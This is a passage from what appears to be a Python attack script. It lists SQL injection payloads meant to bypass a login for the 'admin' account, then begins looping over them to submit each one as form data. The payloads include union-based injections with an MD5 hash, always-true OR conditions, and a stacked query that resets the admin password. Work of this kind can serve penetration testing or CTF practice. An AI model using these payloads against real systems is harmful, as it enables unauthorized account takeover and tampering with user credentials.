    # Try union-based approach
    "admin' UNION SELECT 'admin','7d39307ae824e70052c0aa16816a9b16'-- -",
    "admin' UNION SELECT 'admin',MD5('something')-- -",
    
    # Try making the entire query return true
    "admin' OR username='admin'-- -",
    "admin' OR 1=1-- -",
    "admin'; SELECT * FROM users;-- ",
    
    # Stack query attempt
    "admin'; UPDATE users SET password='newpass' WHERE username='admin';-- ",
    
    # Try with different comment styles  
    "admin" + chr(0) + "' or '1'='1",
]

for payload in payloads:
    data = {
